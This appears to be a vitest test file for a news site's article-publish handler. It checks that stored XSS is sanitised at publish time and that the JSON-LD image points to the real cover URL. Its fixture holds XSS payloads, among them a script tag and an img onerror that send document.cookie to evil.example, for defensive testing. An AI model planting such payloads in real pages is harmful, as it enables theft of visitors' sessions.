import { describe, expect, it } from 'vitest';
import { loadPublishArticle } from '../support/seams.js';
import type { PublishHttpRequest } from '../support/seams.js';
import { buildPublishDeps } from '../support/fakes.js';
import {
  ARTICLE_ID,
  COVER_OPTIMIZED_URL,
  NOW,
  READY_COVER,
  articleRecord,
  imageRecord,
} from '../support/fixtures.js';

/**
 * Two defects `05-verification.v1.md` found in the publish handler, each
 * proved at the fastest layer that can prove it: the handler with fake
 * collaborators. Neither needs Postgres or HTTP.
 *
 *   VERIFY-01a  H1, stored XSS. `sanitizePastedHtml` exists and is unit-tested
 *               but is never called from production code, so `body_html` is
 *               whatever a writer PATCHed through PostgREST — including a
 *               `<script>` tag — all the way to the public page.
 *   VERIFY-06   §6.4, the publish response builds `structured_data.image` from
 *               `article.id` instead of the image that was actually uploaded,
 *               and persists that fabricated URL into `articles.structured_data`.
 */

const publishReq = (overrides: Partial<PublishHttpRequest> = {}): PublishHttpRequest => ({
  article_id: ARTICLE_ID,
  authorization: 'Bearer writer.supabase.jwt',
  idempotency_key: null,
  client_ip: '203.0.113.7',
  body: {},
  ...overrides,
});

/**
 * One body carrying every vector the audit named, so the assertion is about
 * one behaviour (server-side sanitisation at publish time) rather than about
 * one particular tag. The legitimate markup around it must survive: a
 * sanitiser that deletes the article is not a fix.
 */
const POISONED_BODY_HTML = [
  '<h2>Les affiches</h2>',
  '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
  '<p>PSG reçoit Marseille dimanche soir.</p>',
  '<img src="x" onerror="fetch(\'https://evil.example/steal\')"/>',
  '<div onclick="alert(1)">Cliquez ici</div>',
  '<a href="javascript:alert(document.domain)">Notre analyse</a>',
].join('');

describe('publish-time sanitisation (verify finding #1)', () => {
  it('VERIFY-01a / AC-03: publishing an article whose stored body_html contains a script tag, an inline event handler and a javascript: href persists sanitised HTML, keeping the writer’s real content', async () => {
    const api = await loadPublishArticle();
    const { deps, published } = buildPublishDeps({
      now: NOW,
      article: articleRecord({ body_html: POISONED_BODY_HTML }),
      images: READY_COVER,
    });

    await api.handlePublishArticle(publishReq(), deps);
    const persisted = String(published[0]?.body_html ?? '');

    expect({
      persisted_body_html_was_written: published.length === 1 && 'body_html' in (published[0] ?? {}),
      contains_script_tag: /<script/i.test(persisted),
      contains_inline_event_handler: /\bon(error|click)\s*=/i.test(persisted),
      contains_javascript_href: /javascript:/i.test(persisted),
      keeps_the_writers_own_words: persisted.includes('PSG reçoit Marseille dimanche soir.'),
    }).toEqual({
      persisted_body_html_was_written: true,
      contains_script_tag: false,
      contains_inline_event_handler: false,
      contains_javascript_href: false,
      keeps_the_writers_own_words: true,
    });
  });
});

describe('published JSON-LD image (verify finding #6.4)', () => {
  it('VERIFY-06 / AC-14: the publish response’s structured_data.image is the cover image’s real stored URL, not a path built from the article id', async () => {
    const api = await loadPublishArticle();
    const { deps, published } = buildPublishDeps({
      now: NOW,
      article: articleRecord(),
      images: [imageRecord({ optimized_url: COVER_OPTIMIZED_URL })],
    });

    const res = await api.handlePublishArticle(publishReq(), deps);
    const returned = (res.body as any)?.structured_data as Record<string, unknown> | undefined;
    const stored = published[0]?.structured_data as Record<string, unknown> | undefined;

    expect({
      returned_image: returned?.image,
      // The same wrong value is written to articles.structured_data, so the
      // stored column has to be checked too, not just the response.
      persisted_image: stored?.image,
    }).toEqual({
      returned_image: [COVER_OPTIMIZED_URL],
      persisted_image: [COVER_OPTIMIZED_URL],
    });
  });
});
